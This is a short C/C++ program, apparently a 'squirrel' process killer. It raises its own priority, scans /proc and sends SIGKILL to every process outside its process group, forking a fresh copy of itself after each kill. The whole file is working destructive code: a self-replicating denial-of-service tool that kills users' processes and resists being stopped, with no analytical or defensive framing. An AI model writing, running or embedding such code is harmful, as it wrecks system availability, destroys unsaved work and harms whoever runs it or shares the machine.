#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <errno.h>
#include <signal.h>
#include <time.h>
#include <string.h>
#include <string>
#include <dirent.h>
#include <pthread.h>

#define MAX_PID 32768
#define CNT_PTH 16

inline void attack();
inline void bite(int);
inline void spawn();

char* self;
pid_t pgid;


int main(int argc, char* argv[]) {

	setpriority(PRIO_PROCESS, 0, -20);

	self = strdup(argv[0]);

	if (argc != 2) { pgid = getpid(); }
	else           { pgid = atoi(argv[1]); }

	if (setpgid(0, pgid)) {
		printf("setpgid() failed!\n");
	}
	
	attack();
}

inline void attack(){
	while (1) {
		DIR *d;
		struct dirent *e;

		d = opendir("/proc");
		if (d) {
			while ((e = readdir(d))) {
				int pid = atoi(e -> d_name);
				if (pid) { bite(pid); }
			}
			closedir(d);
		}
		else {
			for (int i = 1; i <= MAX_PID; i++) {
				bite(i);
			}
		}
	}
}

inline void bite(int pid) {
	if (getpgid(pid) == pgid) return; // Fellow squirrel
	kill(pid, SIGKILL);
	spawn();
}

inline void spawn() {
	int p = fork();
	if (p == 0) {
		char buffer[32];
		sprintf(buffer, "%d", pgid);

		execl(self, self, buffer, NULL);
	}
}
